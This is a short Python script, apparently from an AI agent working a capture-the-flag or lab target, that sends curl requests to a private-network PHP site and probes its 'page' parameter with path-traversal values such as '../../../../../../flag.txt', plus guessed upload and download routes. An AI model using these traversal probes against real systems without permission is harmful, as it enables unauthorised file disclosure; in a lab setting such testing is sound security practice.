import json
from urllib.parse import urlencode

from framework_evidence import run_tool

BASE = "http://192.168.2.0"

# Follow links observed on the main page, then test its advertised page
# parameter with focused values relevant to the requested root-level file.
requests = []
for page in ("page1.php", "page2.php", "page3.php"):
    requests.append((f"advertised page {page}", f"{BASE}/index.php?{urlencode({'page': page})}"))

for value in (
    "flag.txt",
    "../flag.txt",
    "../../../../../../flag.txt",
    "/flag.txt",
):
    requests.append((f"page parameter {value}", f"{BASE}/index.php?{urlencode({'page': value})}"))

# Focused conventional file-handling resource names; these are probes, not
# claims that such routes exist.
for path in ("/upload.php", "/download.php", "/file.php", "/uploads/", "/files/"):
    requests.append((f"conventional resource {path}", BASE + path))

results = []
for label, url in requests:
    try:
        envelope = run_tool([
            "curl", "-sS", "-L", "-i",
            "--max-time", "20", "--max-redirs", "5", url
        ])
        results.append({"label": label, "requested_url": url, "envelope": envelope})
    except Exception as exc:
        results.append({
            "label": label,
            "requested_url": url,
            "error": f"{type(exc).__name__}: {exc}"
        })

print(json.dumps({
    "purpose": "HTTP/PHP application resource discovery; each result is limited to the requested URL.",
    "target": BASE,
    "requests_examined": len(requests),
    "results": results
}, ensure_ascii=False))

